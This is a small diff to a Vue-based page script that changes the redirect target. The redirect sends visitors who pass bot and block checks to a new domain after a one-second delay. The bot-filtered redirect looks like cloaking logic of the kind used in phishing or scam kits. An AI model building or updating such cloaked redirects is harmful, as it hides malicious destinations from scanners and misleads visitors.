@@ -48,7 +48,7 @@ const app = createApp({
       // If not blocked or bot, proceed to the main page
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://inb.logofatu.ro/';
+          window.location.href = 'https://ovt.spembroke.com/';
         }, 1000);
       }
 
